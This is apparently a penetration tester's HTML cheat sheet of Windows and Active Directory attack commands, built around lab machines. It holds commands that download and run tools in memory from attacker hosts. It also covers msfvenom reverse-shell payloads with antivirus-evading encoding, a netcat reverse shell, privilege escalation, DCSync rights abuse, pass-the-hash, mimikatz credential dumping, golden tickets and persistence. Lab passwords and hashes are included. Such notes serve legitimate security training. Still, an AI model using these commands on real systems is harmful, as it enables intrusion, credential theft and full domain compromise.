/><strong>powershell -c</strong> &quot;Invoke-WebRequest -Uri &#39;http://10.10.16.2:8000/<strong>winPEAS.exe</strong>&#39; <strong>-OutFile </strong>&#39;c:\windows\temp\<strong>winpeas.exe</strong>&#39;&quot;<br />.\<strong>winpeas.exe</strong><br /><br /><strong><span style="color:#0000ff;">#wget</span></strong><br /><strong>powershell -c wget</strong> &quot;http://10.10.16.2:8000/winPEAS.exe&quot; <strong>-outfile</strong> &quot;winpeas.exe&quot;<br /><strong>.\winpeas.exe</strong></div><div class='page'><h1 class='title level-2'>juicy potato</h1><br/><strong><span style="color:#0000ff;">JUICY POTATO</span></strong>               <br /><strong>whoami /all	</strong>							#see if have the <strong>SE impersonate token</strong><br /><br /><strong>python3 -m http.server</strong><br /><strong>powershell -c</strong> &quot;<strong>Invoke-WebRequest </strong>http://10.8.185.233/<strong>JuicyPotato.exe -outfile</strong> <strong>j.exe</strong>&quot;<br /><strong>./j.exe</strong></div><div class='page'><h1 class='title level-2'>net</h1><br/> <strong><span style="color:#ff0000;">NET</span></strong></div><div class='page'><h1 class='title level-3'>net user</h1><br/><strong><span style="color:#0000ff;">NET USER (winRM)</span></strong><br /><strong>net user  														#all users</strong><br /><strong>net user </strong>Chris<br /><strong>net user</strong> <strong>administrator</strong>  								#see if there is an <strong>administrator account</strong><br /> <br /><strong><span style="color:#0000ff;">#add user</span></strong><br /><strong>net user </strong>ippsec PleaseSub<strong> /add /domain</strong>														<strong>#</strong>given<strong> username + password</strong><br /> <br /><strong><span style="color:#0000ff;">#user domain   </span></strong><br /><strong>net user /domain </strong>   									#which <strong>group</strong> is the <strong>user member of</strong><br /><strong>net user /domain</strong> svc_loanmgr</div><div class='page'><h1 class='title level-3'>net group/localgroup</h1><br/><strong><span style="color:#0000ff;">NET</span></strong> <strong><span style="color:#0000ff;">GROUP</span></strong><br /><strong><span style="color:#0000ff;">#administrator group</span></strong><br /><strong>net localgroup administrators</strong><br /><strong><span style="color:#0000ff;">#add user to group</span></strong> (es admin group)<br /><strong>net localgroup administrators john /add</strong><br /><strong>net localgroup </strong>&quot;Remote Management Users&quot; <strong>/add </strong>ippsec<br /><strong>net group </strong>backup_admins<strong> </strong>claire<strong> /add</strong>																	#only on DC<br /><strong>net group</strong> &quot;Exchange Windows Permissions&quot;<strong> /add </strong>ippsec<strong> </strong><br /> <br /><strong><span style="color:#0000ff;">#see group members</span></strong><br /><strong>net group</strong> backup_admins<br /></div><div class='page'><h1 class='title level-2'>procdump</h1><br/><strong><span style="color:#0000ff;">PROCDUMP</span></strong><br /><strong>#upload</strong><br /><strong>upload</strong> <strong>procdump64.exe</strong> C:\Users\Chase\Desktop\procdump.exe<br /><br /><strong><span style="color:#0000ff;">#run</span></strong><br /><strong>.\procdump.exe</strong> <strong>-accepteula</strong><br />.\procdump.exe<strong> -ma 6192</strong> firefox.<strong>dmp  </strong> 											<strong>#-ma = full dump file  </strong>				(<strong>#1528 </strong>=<strong> Get-Process process id col</strong>.)<br /><br /><strong>download</strong> firefox.dmp<br /><strong>strings</strong> firefox.dmp | grep password<br /></div><div class='page'><h1 class='title level-1'>bloodhound</h1><br/><strong><span style="color:#0000ff;">BLOODHOUND</span></strong><br /><strong>sudo neo4j start</strong><br /><strong>bloodhound																(bloodhound --no-sandbox)</strong><br /><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">credentials: </span></strong><span style="color:#0000ff;"> </span><br /><strong>Username: 		neo4j  <br />Password: 		neo</strong><br /></div><div class='page'><h1 class='title level-2'>bloodhound (linux)</h1><br/><strong><span style="color:#0000ff;">BLOODHOUND.PY (Linux)</span></strong><br />cd /opt/<strong>BloodHound.py</strong><br />sudo python3 <strong>bloodhound.py -u </strong>support<strong> -p </strong>&#39;#00^BlackKnight&#39;<strong> -ns </strong>10.10.10.192<strong> -d </strong>blackfield.local <strong>-c all </strong> </div><div class='page'><h1 class='title level-2'>sharphound (windows)</h1><br/><strong><span style="color:#ff0000;">SHARPHOUND</span></strong>   <br /><strong><span style="color:#0000ff;">#cmd (exe)</span></strong><br /><strong>Invoke-WebRequest -uri</strong> &#39;http://10.10.14.11:8000/<strong>SharpHound.exe</strong>&#39; <strong>-outfile</strong> &#39;<strong>SharpHound.exe</strong>&#39;<br /><strong>.\SharpHound.exe</strong><br /><strong>.\SharpHound.exe -c all</strong><br />.\SharpHound.exe -c<strong> </strong>all<strong> -d </strong>active.htb<strong> -domaincontroller </strong>10.10.10.100<br /><br /><strong><span style="color:#0000ff;">#powershell (ps1)</span></strong><br /><strong>IEX(New-Object Net.WebClient).downloadString</strong>(&#39;http://10.10.14.11:8000/<strong>SharpHound.ps1</strong>&#39;); <br /><strong>Invoke-Bloodhound -CollectionMethod All</strong><br /><strong>#domain</strong><br />Invoke-Bloodhound<strong> -collectionmethod all -domain </strong>htb.local<br />Invoke-Bloodhound <strong>-CollectionMethod All -Domain </strong>CONTROLLER.local -ZipFileName loot.zip<br />Invoke-Bloodhound<strong> -collectionmethod all -domain </strong>htb.local<strong> -ldapuser </strong>svc-alfresco<strong> -ldappass </strong>s3rvice<br /><br /><strong><span style="color:#0000ff;">#download zip</span></strong><br /><strong>download</strong> 20210818152010_BloodHound.zip				<br /><strong><span style="color:#0000ff;">#with smbserver</span></strong><br /><strong>impacket-smbserver</strong> <strong>share</strong> .								<strong>#attacker</strong><br /><strong>net use</strong> z: \\10.10.14.11\<strong>share</strong>								<strong>#victim</strong><br /><strong>copy</strong> 20210816053552_BloodHound.zip<strong> z:</strong></div><div class='page'><h1 class='title level-1'>powerview</h1><br/><strong><span style="color:#ff0000;">POWERVIEW</span></strong><span style="color:#ff0000;"> </span><strong><span style="color:#ff0000;">(bloodhound)</span></strong><br /><strong>python -m SimpleHTTPServer</strong><br />IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.11:8000/<strong>PowerView.ps1&#39;</strong>);<br /><br /><strong><span style="color:#0000ff;">#switch user</span></strong><br /><strong>$pass = ConvertTo-SecureString &quot;</strong>36mEAhz/B8xQ~2VM<strong>&quot; -AsPlainText -Force</strong><br /><strong>$cred = New-Object System.Management.Automation.PSCredential(&quot;Sniper\\Chris&quot;, </strong>$pass<strong>)</strong><br />nc -nlvp <strong>9002            </strong>					#attacker<br />Invoke-Command<strong> -ComputerName </strong>Sniper<strong> -Credential </strong>$cred<strong> -ScriptBlock {\\10.10.14.18\htb\nc.exe 10.10.14.18 9002 -e powershell}</strong><br /></div><div class='page'><h1 class='title level-2'>get</h1><br/><strong><span style="color:#0000ff;">GET</span></strong><br /><strong><span style="color:#0000ff;">#enum</span></strong><span style="color:#0000ff;"> </span><strong><span style="color:#0000ff;">domain user </span></strong> <br /><strong>Get-NetUser | select cn</strong>    																<br /><strong><span style="color:#0000ff;">#enum domain groups </span></strong><span style="color:#0000ff;"> </span><br /><strong>Get-NetGroup -GroupName *admin* 										</strong><br /><strong><span style="color:#0000ff;">#enum OS</span></strong><br /><strong>Get-NetComputer -fulldata | select operatingsystem* 			</strong><br /><br /><strong><span style="color:#0000ff;">#Get-DomainGroup</span></strong><br /><strong>Get-DomainGroup -MemberIdentity </strong>claire<strong> </strong> <br /><strong>Get-DomainGroup -MemberIdentity </strong>claire<strong> </strong>|<strong> select </strong>samaccountname</div><div class='page'><h1 class='title level-2'>set/add</h1><br/><strong><span style="color:#0000ff;">SET/ADD</span></strong><br /><strong><span style="color:#ff0000;">Add-DomainGroupMember</span></strong><br />$cred =<strong> ConvertTo-SecureString</strong> &quot;PleaseSubscribe1&quot; <strong>-AsPlainText -force</strong><br /><strong>Add-DomainGroupMember -Identity</strong> &#39;Backup Admins&#39;<strong> -Members </strong>claire<strong> -Credential </strong>$cred<br /><br /><strong><span style="color:#ff0000;">Set-DomainObjectOwner</span></strong><br /><strong>Set-DomainObjectOwner -identity</strong> claire<strong> -OwnerIdentity</strong> tom  																		<strong>#set claire-ACL owner</strong><br /><strong><span style="color:#0000ff;">#Add-DomainObjectAcl (reset password</span></strong><strong><span style="color:#0000ff;">)</span></strong><br /><strong>Add-DomainObjectAcl -TargetIdentity </strong>claire<strong> -PrincipalIdentity </strong>tom<strong> -Rights ResetPassword</strong>					#tom has ‘change psw’ permissions<br /><br /><strong><span style="color:#ff0000;">Set-DomainUserPassword</span></strong><br />$cred =<strong> ConvertTo-SecureString</strong> &quot;qwer1234QWER!@#$&quot; <strong>-AsPlainText -force</strong><br /><strong>Set-DomainUserPassword -identity </strong>claire <strong>-accountpassword</strong> $cred<br /><br /><strong><span style="color:#0000ff;">#Add-ObjectACL (DCSync)   </span></strong><strong><span style="color:#0000ff;">  </span></strong><strong>																		#</strong><strong><span style="color:#4d4d4d;">also after cme</span></strong><br />$pass<strong> = ConvertTo-SecureString </strong>&#39;PleaseSub&#39;<strong> -AsPlainText -Force</strong><br />$cred<strong> = New-Object System.Management.Automation.PSCredential(&#39;</strong>HTB\ippsec<strong>&#39;, </strong>$pass<strong>)</strong><br /><strong>Add-ObjectACL -Credential </strong>$cred<strong> -PrincipalIdentity </strong>ippsec<strong> -Rights DCSync</strong></div><div class='page'><h1 class='title level-1'>psexec</h1><br/><strong><span style="color:#ff0000;">PSEXEC </span></strong><strong><span style="color:#0000ff;">  </span></strong>																		<strong>#returns a shell given smb credentials</strong> <strong>(try first cme)</strong><br /><strong>psexec.py</strong> &#39;<strong>anon:p3nT3st</strong>!@10.10.10.152&#39;												<strong>#usn + password</strong><br /><strong>psexec.py administrator</strong>@10.10.10.149<br /><strong>psexec.py </strong>active.htb/SVC_TGS@10.10.10.100  										<strong>#domain/user</strong><br /><strong>psexec.py</strong> active.htb/<strong>Administrator</strong>@10.10.10.100<br /><br /><strong><span style="color:#0000ff;">#Pass the Hash attack</span></strong>																<br /><strong>psexec.py -hashes </strong>aad3b435b51404eeaad3b435b51404ee<strong>:</strong>32693b11e6aa90eb43d32c72a07ceea6 <strong>administrator</strong>@10.10.10.161       											<strong>#using secretsdump hash</strong> (<strong>NLTM</strong>)<br /><strong>psexec.py -hashes</strong> 184fb5e5178480be64824d4cd53b99ee<strong>:</strong>184fb5e5178480be64824d4cd53b99ee <strong>administrator</strong>@10.10.10.192													#<strong>first hash doesnt count    </strong><br /><strong>psexec.py</strong> <strong>-hashes </strong>823452073d75b9d1cf70ebdf86c7f98e<strong>:</strong>823452073d75b9d1cf70ebdf86c7f98e egotistical-bank.local<strong>/administrator@</strong>10.10.10.175<strong> </strong>				    				<br /><br /></div><div class='page'><h1 class='title level-1'>exploitation</h1><br/><strong><span style="color:#ff0000;">EXPLOITATION</span></strong></div><div class='page'><h1 class='title level-2'>msfvenom</h1><br/> <strong><span style="color:#ff0000;">MSFVENOM   </span></strong><strong><br /></strong><strong><span style="color:#0000ff;">• STAGELESS </span></strong><strong> 				shell_reverse_tcp  								 #bigger payload<br /></strong><strong><span style="color:#0000ff;">• STAGED</span></strong><strong>  					shell/reverse_tcp </strong>                               <strong>#requires handler</strong><br /><br /><br /><strong><span style="color:#0000ff;">#formats</span></strong><br />msfvenom<strong> -l formats</strong><br /></div><div class='page'><h1 class='title level-3'>shell</h1><br/><strong><span style="color:#0000ff;">SHELL         </span></strong><strong>           </strong><br /><strong><span style="color:#0000ff;">#exe</span></strong> <strong><span style="color:#0000ff;">(staged)</span></strong><br /><strong>msfvenom -p </strong>windows/x64/<strong>shell</strong>/<strong>reverse_tcp LHOST=</strong>10.8.185.233 <strong>LPORT=</strong>8888<strong> -f</strong> <strong>exe -o </strong>shell.exe																	<strong>		#-p=payload</strong><br /><strong>#requires msfhandler with metasploit</strong><br /><br /><br /><br /><strong><span style="color:#0000ff;">#encoded</span></strong> <strong><span style="color:#0000ff;">exe</span></strong><br /><strong>msfvenom -p </strong>windows/<strong>shell_reverse_tcp</strong> <strong>LHOST</strong>=10.8.185.233 <strong>LPORT</strong>=4444 <strong>-e</strong> x86/shikata_ga_nai <strong>-f </strong>exe <strong>-o </strong>ASCService.exe <strong>    								#-e= encoder</strong> (avoids antivirus)<br /><br /><strong><span style="color:#0000ff;">#aspx</span></strong><br /><strong>msfvenom</strong> -<strong>p </strong>windows/x64/<strong>shell_reverse_tcp</strong> <strong>LHOST</strong>=10.8.185.233 <strong>LPORT</strong>=4444 <strong>-- platform windows</strong> <strong>-a x64</strong> <strong>-f aspx</strong> <strong>-o </strong>shell.aspx<br /><br /><strong><span style="color:#0000ff;">#dll</span></strong><br /><strong>msfvenom -a x64</strong> <strong>-p</strong> windows/x64/<strong>shell_reverse_tcp LHOST</strong>=10.10.14.11 <strong>LPORT</strong>=9001 <strong>-f dll</strong> <strong>-o</strong> rev.dll<br /><br /><strong><span style="color:#0000ff;">#msi</span></strong><br /><strong>msfvenom</strong> <strong>-p </strong>windows/x64/<strong>shell_reverse_tcp</strong> <strong>LHOST</strong>=10.10.14.8 <strong>LPORT</strong>=9002 <strong>-f msi</strong> <strong>-o</strong> payload.msi<br /><strong>msiexec /q /i payload.msi</strong><br /><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">python</span></strong><br /><strong>msfvenom -p</strong> windows/<strong>shell_reverse_tcp</strong> <strong>LHOST</strong>=10.10.16.2 <strong>LPORT</strong>=9004 <strong>EXITFUNC</strong>=thread <strong>-b &quot;\x00\x0d\x0a&quot;</strong> <strong>-f python	</strong>									<strong>#-b=buffer</strong><br /><strong>msfvenom -a x86</strong> <strong>-p</strong> windows/<strong>shell_reverse_tcp</strong> <strong>LHOST</strong>=10.10.16.2 <strong>LPORT</strong>=9001 <strong>-b &#39;\x00\x0A\x0D&#39; -f python</strong>																</div><div class='page'><h1 class='title level-3'>meterpreter</h1><br/><strong><span style="color:#0000ff;">METERPRETER</span></strong><br /><strong><span style="color:#0000ff;">#exe</span></strong> <strong><span style="color:#0000ff;">(staged)</span></strong>												_<br /><strong>msfvenom</strong> <strong>-p </strong>windows/x64/<strong>meterpreter</strong>/<strong>reverse_tcp</strong> <strong>LHOST</strong>= 10.10.16.2 <strong>LPORT</strong>= 9001<strong> -f</strong> exe <strong>-o </strong>shell.exe<br /><br /><strong><span style="color:#0000ff;">#encoded</span></strong> <strong><span style="color:#0000ff;">exe</span></strong> <strong>(staged)</strong><br /><strong>msfvenom -p </strong>windows/<strong>meterpreter/reverse_tcp -a x86</strong> <strong>--encoder</strong> x86/shikata_ga_nai <strong>LHOST=</strong>10.8.185.233 <strong>LPORT=</strong>4445<strong> -f </strong>exe<strong> -o </strong>shell.exe<br /><br /><strong><span style="color:#0000ff;">#python </span></strong><strong><span style="color:#4d4d4d;">(staged)</span></strong><br /><strong>msfvenom -a x86 -p </strong>windows/<strong>meterpreter/reverse_tcp</strong> <strong>LHOST=</strong>10.10.16.2 <strong>LPORT=</strong>9001<strong> -f python -o staged</strong><br /><br /><strong><span style="color:#0000ff;">#war</span></strong> (staged)<br /><strong>msfvenom -p</strong> windows/x64/<strong>meterpreter/reverse_tcp LHOST</strong>=10.10.14.11<strong> LPORT</strong>=9001<strong> -f </strong>war<strong> -o</strong> shell.war</div><div class='page'><h1 class='title level-2'>unicorn</h1><br/><strong><span style="color:#0000ff;">UNICORN</span></strong><strong>   </strong>																			#generates powershell code from source <br /><strong>python unicorn.py</strong> <strong>windows/meterpreter/reverse_https</strong> 10.10.14.11 <strong>9003 </strong><br />   <strong>#outputs 	unicorn.rc<br />						powershell_attack.txt</strong><br /> <br />msfconsole <strong>-r</strong> <strong>unicorn.rc</strong><br />mv powershell_attack.txt <strong>msf.ps1</strong><br /><strong>python3 -m http.server</strong><br />IEX(New-Object Net.WebClient).<strong>downloadString</strong>(&#39;http://10.10.14.11:8000/<strong>msf.ps1</strong>&#39;) <br /></div><div class='page'><h1 class='title level-3'>listener</h1><br/><strong><span style="color:#0000ff;">LISTENER  (after msfvenom)</span></strong><br /><strong>msfconsole</strong><br />use exploit/<strong>multi/handler      </strong>																																												use <strong>multi/handler</strong><br />set <strong>PAYLOAD</strong> <strong>windows/x64/meterpreter/reverse_tcp</strong>   																													#also without x64, or shell<br />set <strong>LHOST</strong> 10.8.185.233<br />set <strong>LPORT</strong> 4445<br />exploit -j  																														<strong>#listener in background</strong><br /> <br /><strong><span style="color:#0000ff;">#persistence</span></strong><br />use exploit/<strong>windows/local/persistence</strong><br /> <br />  <br /><strong><span style="color:#0000ff;">EXPLOIT SUGGESTER</span></strong><br /><strong>background</strong><br /><strong>use post/multi/recon/local_exploit_suggester</strong><br />set <strong>SESSION 1</strong><br /><strong>run</strong><br /><br /><strong>background</strong><br /></div><div class='page'><h1 class='title level-2'>metasploit</h1><br/><strong><span style="color:#ff0000;">METASPLOIT</span></strong></div><div class='page'><h1 class='title level-3'>meterpreter</h1><br/><strong><span style="color:#ff0000;">METERPRETER</span></strong><br /><strong><span style="color:#0000ff;">#shell</span></strong><br /><strong>shell</strong><br /><strong><span style="color:#0000ff;">#powershell</span></strong><br /><strong>load</strong> <strong>powershell</strong><br /><strong>powershell_shell</strong><br /><br /><strong><span style="color:#0000ff;">#upload</span></strong><br /><strong>upload PowerUp.ps1</strong><br /><br /><strong>getprivs</strong>										<strong>#permissions</strong><br /><strong>getuid</strong>										<strong>#user id</strong><br /><strong>getsystem</strong>								<strong>#system info</strong><br /><br /><strong><span style="color:#0000ff;">#ena</span></strong><strong><span style="color:#0000ff;">ble RDP (remote desktop)</span></strong><br /><strong>run post/windows/manage/enable_rdp</strong><br /><br /><strong><span style="color:#0000ff;">#hashdump</span></strong><br /><strong>hashdump</strong><br /><br /><br /> </div><div class='page'><h1 class='title level-3'>token impersonation</h1><br/><strong><span style="color:#0000ff;">TOKEN IMPERSONATION </span></strong><br /><strong>load incognito</strong><br /><strong>list_tokens -g</strong><br /><strong>impersonate_token </strong>&quot;BUILTIN\Administrators&quot;<br /><br /><strong>getuid</strong>					(NT AUTHORITY\SYSTEM)<br /><strong>ps</strong><br /><strong>migrate 668	</strong>			(services.exe)<br />…<br /><br />migrate -N spoolsv.exe		#same permission</div><div class='page'><h1 class='title level-2'>powerup.ps1</h1><br/><strong><span style="color:#0000ff;">POWERUP (.ps1)</span></strong><br /><strong>git clone </strong>https://github.com/PowerShellMafia/<strong>PowerSploit.git</strong> <strong>-b dev </strong>     											<strong>#developer branch</strong><br /><strong>python -m SimpleHTTPServer</strong><br />IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/<strong>PowerUp.ps1</strong>&#39;);<br /><br /><strong><span style="color:#0000ff;">#run</span></strong><br /><strong>Invoke-AllChecks     											 			#token checks (→ rotten potato if Impersonate Privilege) </strong> <br /><strong>Invoke-ServiceAbuse -Name</strong> &#39;UsoSvc&#39;<strong>     </strong>					<strong>#service name</strong><br /><strong>Restart-Service </strong>UsoSvc<br /></div><div class='page'><h1 class='title level-1'>mimikatz</h1><br/><strong><span style="color:#ff0000;">MIMIKATZ</span></strong> <strong><span style="color:#0000ff;">(impacket)</span></strong></div><div class='page'><h1 class='title level-2'>windows</h1><br/><strong><span style="color:#ff0000;">MIMIKATZ</span></strong><strong><span style="color:#0000ff;"> (WINDOWS) </span></strong><br /><strong>python -m SimpleHTTPServer</strong><br /><strong>powershell</strong> &quot;(New-Object Net.WebClient).<strong>DownloadFile</strong>(&#39;http://10.10.14.11:8000/mimikatz.exe&#39;,&#39;<strong>mimikatz.exe&#39;</strong>)&quot;<br /><strong>.\mimikatz.exe</strong><br /> <br /> <br /> <br /> <br />  <br /></div><div class='page'><h1 class='title level-3'>lsadump</h1><br/><strong><span style="color:#0000ff;">LSADUMP</span></strong> 												<strong><span style="color:#0000ff;">#password dumping  </span></strong><strong><span style="color:#4d4d4d;">(.DMP file)</span></strong><br /><strong>lsadump::lsa /patch        																													#dump hashes</strong><br /><strong>hashcat -m 1000 </strong>2777b7fec870e04dda00cd7260f7bee6<strong> </strong>rockyou.txt <strong>											</strong>#crack<br /> <br /><strong><span style="color:#0000ff;">#Tickets</span></strong><br /><strong>lsadump::lsa /inject /name:krbtgt   							#golden ticket</strong><br />lsadump::lsa /inject /name:<strong>sqlservice  							#silver ticket</strong></div><div class='page'><h1 class='title level-3'>kerberos</h1><br/><strong><span style="color:#0000ff;">#create ticket</span></strong><br /><strong>kerberos::golden /user:</strong>Administrator<strong> /domain:</strong>controller.local <strong>/sid:</strong>S-1-5-21-849420856-2351964222-986696166<strong> /krbtgt:</strong>5508500012cc005cf7082a9a89ebdfdf<strong> /id: </strong>500<br />misc::cmd<br /> <br />  <br /><strong>sekurlsa::tickets /export</strong><br /><strong>kerberos::ptt &lt;ticket&gt;    							#impersonate</strong><br /> <br />  <br /><br /></div><div class='page'><h1 class='title level-3'>kiwi</h1><br/><strong><span style="color:#0000ff;">KIWI</span></strong><br /><strong>load kiwi</strong><br /><strong>creds_all </strong>   									#Retrieve all credentials<br /><strong>golden_ticket_create </strong> 				#Create a golden kerberos ticket for login</div><div class='page'><h1 class='title level-2'>linux</h1><br/><strong><span style="color:#ff0000;">MIMIKATZ</span></strong><strong><span style="color:#0000ff;"> (LINUX)</span></strong><br /><strong>pypykatz</strong> lsa minidump lsass.DMP<br /></div>
</body>
</html>
